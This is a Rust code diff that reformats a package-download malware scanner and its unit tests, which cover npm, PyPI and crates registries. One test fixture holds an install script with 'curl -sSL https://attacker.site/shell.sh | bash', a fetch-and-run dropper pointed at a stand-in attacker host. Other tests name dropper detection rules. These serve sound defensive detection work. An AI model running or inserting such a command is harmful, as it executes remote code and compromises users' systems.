@@ -188,7 +188,9 @@ impl PackageScanner {
             || path_lower.ends_with(".whl")
             || path_lower.ends_with(".gem");
 
-        if (is_npm || is_pypi || is_crates || is_rubygems) && (has_archive_ext || ct_lower.contains("gzip") || ct_lower.contains("octet-stream")) {
+        if (is_npm || is_pypi || is_crates || is_rubygems)
+            && (has_archive_ext || ct_lower.contains("gzip") || ct_lower.contains("octet-stream"))
+        {
             return true;
         }
 
@@ -355,8 +357,14 @@ mod tests {
     fn test_clean_package_passes() {
         let scanner = test_scanner();
         let files = [
-            ("package/package.json", br#"{"name":"safe-pkg","version":"1.0.0"}"# as &[u8]),
-            ("package/index.js", b"module.exports = function hello() { return 'world'; };"),
+            (
+                "package/package.json",
+                br#"{"name":"safe-pkg","version":"1.0.0"}"# as &[u8],
+            ),
+            (
+                "package/index.js",
+                b"module.exports = function hello() { return 'world'; };",
+            ),
         ];
         let tarball = create_test_tarball(&files);
         match scanner.scan_tarball(&tarball) {
@@ -375,7 +383,10 @@ mod tests {
         let tarball = create_test_tarball(&files);
         match scanner.scan_tarball(&tarball) {
             PackageScanResult::Threat(t) => {
-                assert!(t.rule_name == "suspicious_lifecycle_script" || t.rule_name == "npm_shai_hulud_dropper");
+                assert!(
+                    t.rule_name == "suspicious_lifecycle_script"
+                        || t.rule_name == "npm_shai_hulud_dropper"
+                );
             }
             PackageScanResult::Clean => panic!("Expected threat detection for Keyv dropper!"),
         }
@@ -401,8 +412,14 @@ mod tests {
     fn test_detect_reverse_shell_dropper() {
         let scanner = test_scanner();
         let files = [
-            ("package/package.json", br#"{"name":"bad-shell","version":"1.0.0"}"# as &[u8]),
-            ("package/install.sh", b"curl -sSL https://attacker.site/shell.sh | bash"),
+            (
+                "package/package.json",
+                br#"{"name":"bad-shell","version":"1.0.0"}"# as &[u8],
+            ),
+            (
+                "package/install.sh",
+                b"curl -sSL https://attacker.site/shell.sh | bash",
+            ),
         ];
         let tarball = create_test_tarball(&files);
         match scanner.scan_tarball(&tarball) {
@@ -415,9 +432,25 @@ mod tests {
 
     #[test]
     fn test_is_package_download_filter() {
-        assert!(PackageScanner::is_package_download("registry.npmjs.org", "/keyv/-/keyv-6.0.0.tgz", Some("application/octet-stream")));
-        assert!(PackageScanner::is_package_download("files.pythonhosted.org", "/packages/foo/foo-1.0.0.whl", Some("application/zip")));
-        assert!(PackageScanner::is_package_download("static.crates.io", "/crates/serde/serde-1.0.0.crate", Some("application/x-tar")));
-        assert!(!PackageScanner::is_package_download("example.com", "/index.html", Some("text/html")));
+        assert!(PackageScanner::is_package_download(
+            "registry.npmjs.org",
+            "/keyv/-/keyv-6.0.0.tgz",
+            Some("application/octet-stream")
+        ));
+        assert!(PackageScanner::is_package_download(
+            "files.pythonhosted.org",
+            "/packages/foo/foo-1.0.0.whl",
+            Some("application/zip")
+        ));
+        assert!(PackageScanner::is_package_download(
+            "static.crates.io",
+            "/crates/serde/serde-1.0.0.crate",
+            Some("application/x-tar")
+        ));
+        assert!(!PackageScanner::is_package_download(
+            "example.com",
+            "/index.html",
+            Some("text/html")
+        ));
     }
 }
